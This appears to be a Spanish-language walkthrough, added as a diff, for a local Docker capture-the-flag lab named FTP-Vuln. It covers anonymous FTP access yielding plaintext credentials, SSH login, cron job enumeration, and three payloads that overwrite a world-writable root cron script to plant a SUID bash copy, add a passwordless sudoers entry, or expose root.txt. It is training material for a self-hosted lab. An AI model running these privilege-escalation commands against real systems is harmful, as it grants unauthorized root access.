@@ -1,0 +1,74 @@
++---------------------------------------------+
+|       FTP-Vuln - Boot to Root Challenge      |
+|       Dificultad: Facil                      |
+|       Objetivo: Encontrar user.txt y root.txt|
++---------------------------------------------+
+
+# 1. Construir imagen
+sudo docker build -t ftp-vuln /mnt/sdb/mis_datos/ORAMI/FTP-Vuln/
+
+# 2. Eliminar contenedor e imagen previos (si existen)
+sudo docker stop ftp-vuln 2>/dev/null; sudo docker rm ftp-vuln 2>/dev/null
+sudo docker rmi ftp-vuln 2>/dev/null
+
+# 3. Ejecutar contenedor
+sudo docker run -d --name ftp-vuln -p 2121:21 -p 2222:22 -p 30000-30010:30000-30010 ftp-vuln
+
+# 4. Escanear servicios con nmap
+nmap -sC -sV -p 2121,2222 localhost
+
+# 5. FTP anonimo (obligatorio -p para modo pasivo)
+ftp -p localhost 2121
+# Name: anonymous
+# Password: [ENTER]
+# cd files
+# get leeme.txt
+# quit
+# -> leeme.txt contiene: credentials: oramiuser:123456
+
+# 6. SSH
+ssh oramiuser@localhost -p 2222
+# Password: 123456
+# cat user.txt
+
+# 7. Enumerar cronjobs (dentro del SSH)
+# Por que buscar cronjobs? Despues de obtener acceso como usuario normal,
+# el siguiente objetivo es escalar a root. Los cronjobs son un vector
+# comun porque se ejecutan automaticamente y suelen correr como root.
+# Si el script que ejecutan es modificable por cualquier usuario,
+# un atacante puede reemplazarlo con un payload malicioso.
+#
+# Comandos para enumerar:
+crontab -l
+cat /etc/cron.d/*
+cat /etc/crontab
+find /etc/cron* -type f -writable 2>/dev/null
+find /usr/local/bin -type f -writable 2>/dev/null
+ls -l /usr/local/bin/backup.sh
+# -> backup.sh tiene permisos 777 (cualquier usuario puede modificarlo)
+# -> El cronjob lo ejecuta cada minuto como root
+
+# 8. Escalar a root (elegir una opcion)
+
+# Opcion A (SUID):
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
+chmod +x /usr/local/bin/backup.sh
+# Esperar 1 minuto
+/tmp/rootbash -p
+cat /root/root.txt
+
+# Opcion B (sudoers):
+echo -e '#!/bin/bash\nchmod 777 /etc/sudoers\necho "oramiuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\nchmod 440 /etc/sudoers' > /usr/local/bin/backup.sh
+chmod +x /usr/local/bin/backup.sh
+# Esperar 1 minuto
+sudo su
+cat /root/root.txt
+
+# Opcion C (mas simple):
+echo -e '#!/bin/bash\nchmod 777 /root/root.txt' > /usr/local/bin/backup.sh
+chmod +x /usr/local/bin/backup.sh
+# Esperar 1 minuto
+cat /root/root.txt
+
+# 9. Limpiar
+sudo docker stop ftp-vuln && sudo docker rm ftp-vuln
